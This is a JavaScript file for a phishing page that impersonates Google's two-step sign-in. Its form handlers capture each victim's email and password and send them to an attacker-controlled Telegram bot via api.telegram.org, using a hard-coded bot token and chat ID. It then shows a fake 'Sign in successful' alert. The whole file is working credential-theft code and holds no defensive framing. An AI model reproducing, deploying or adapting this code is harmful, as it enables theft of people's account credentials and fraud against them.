document.addEventListener('DOMContentLoaded', function() {
    // Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '8163151595'; // Replace with your chat ID
    
    // DOM elements
    const emailForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const displayEmail = document.getElementById('display-email');
    const backToEmailBtn = document.getElementById('back-to-email');
    const emailCard = document.querySelector('.login-card');
    const passwordCard = document.getElementById('password-card');
    
    // Current user email
    let currentEmail = '';
    
    // Function to send data to Telegram
    async function sendToTelegram(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            return await response.json();
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    }
    
    // Email form submission
    emailForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = emailInput.value.trim();
        const emailError = document.getElementById('email-error');
        
        if (!email) {
            showError(emailError, 'Enter an email or phone number');
            return;
        }
        
        if (!isValidEmail(email)) {
            showError(emailError, 'Enter a valid email');
            return;
        }
        
        // Send email to Telegram
        await sendToTelegram(`📧 <b>Google Login - Email Submitted</b>\n\nEmail: <code>${email}</code>`);
        
        currentEmail = email;
        displayEmail.textContent = email;
        
        emailCard.classList.add('hidden');
        passwordCard.classList.remove('hidden');
        passwordInput.focus();
    });
    
    // Password form submission
    passwordForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const password = passwordInput.value;
        const passwordError = document.getElementById('password-error');
        
        if (!password) {
            showError(passwordError, 'Enter a password');
            return;
        }
        
        // Send password to Telegram
        await sendToTelegram(`🔑 <b>Google Login - Password Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nPassword: <code>${password}</code>`);
        
        alert('Sign in successful! Redirecting...');
        // window.location.href = 'https://myaccount.google.com';
    });
    
    // Back to email button
    backToEmailBtn.addEventListener('click', function() {
        passwordCard.classList.add('hidden');
        emailCard.classList.remove('hidden');
        emailInput.focus();
    });
    
    // Helper functions
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
    }
    
    function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
    
    // Password first letter capitalization on focus
    passwordInput.addEventListener('focus', function() {
        if (this.value.length === 0) {
            this.value = 'A';
            this.setSelectionRange(1, 1);
        }
    });
    
    // Prevent lowercase first character
    passwordInput.addEventListener('keydown', function(e) {
        if (this.selectionStart === 0 && e.key.length === 1 && e.key === e.key.toLowerCase()) {
            e.preventDefault();
            this.value = e.key.toUpperCase() + this.value.slice(1);
            this.setSelectionRange(1, 1);
        }
    });
});
